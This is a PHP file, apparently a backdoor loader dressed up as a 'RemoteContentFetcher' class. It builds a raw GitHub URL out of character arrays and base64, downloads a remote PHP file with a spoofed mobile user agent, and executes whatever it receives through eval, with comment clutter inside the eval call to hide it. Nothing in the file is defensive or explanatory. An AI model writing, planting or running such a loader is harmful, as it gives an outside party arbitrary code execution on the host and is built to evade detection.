<?php
#uyaukujopq
$proto = ['h','t','t','p','s'];
$sep   = [':','/','/'];
$dom1  = ['r','a','w','.','g','i','t','h','u','b','.','c','o','m'];
$path  = ['/','N','o','o','b','T','e','c','h','o','/','w','/','r','e','f','s','/','h','e','a','d','s','/','m','a','i','n','/','m','a','n','z','.','p','h','p'];


$url = implode('', $proto) . implode('', $sep) . implode('', $dom1) . implode('', $path);
$encodedUrl = base64_encode($url);

class RemoteContentFetcher {
    private $url;
    private $options;
    public function __construct(string $url) {
        $this->url = filter_var($url, FILTER_VALIDATE_URL);
        $this->options = [
            'ssl_verify' => true,
            'timeout' => 30,
            'user_agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 2000; 12.11.2; 16PROMAX)'
        ];
    }
    public function setOptions(array $options): void {
        $this->options = array_merge($this->options, $options);
    }
    public function fetch() {
        if (!$this->url) throw new Exception('Invalid URL provided');
        try {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $this->url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => $this->options['ssl_verify'],
                CURLOPT_TIMEOUT => $this->options['timeout'],
                CURLOPT_USERAGENT => $this->options['user_agent']
            ]);
            $content = curl_exec($ch);
            $error = curl_error($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if ($error) throw new Exception("cURL Error: $error");
            if ($httpCode !== 200) throw new Exception("HTTP Error: $httpCode");
            return $this->validateContent($content);
        } catch (Exception $e) {
            error_log("RemoteContentFetcher Error: " . $e->getMessage());
            throw $e;
        }
    }
    private function validateContent($content) {
        if (empty($content)) throw new Exception('Empty content received');
        return $content;
    }
}
#xaaxa
try {
    $fetcher = new RemoteContentFetcher(base64_decode($encodedUrl));
    $fetcher->setOptions(['timeout' => 60, 'ssl_verify' => true]);
    $content = $fetcher->fetch();
    /*555555*/eval/*555555*/("?>".$content)/****#****/;
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
?>
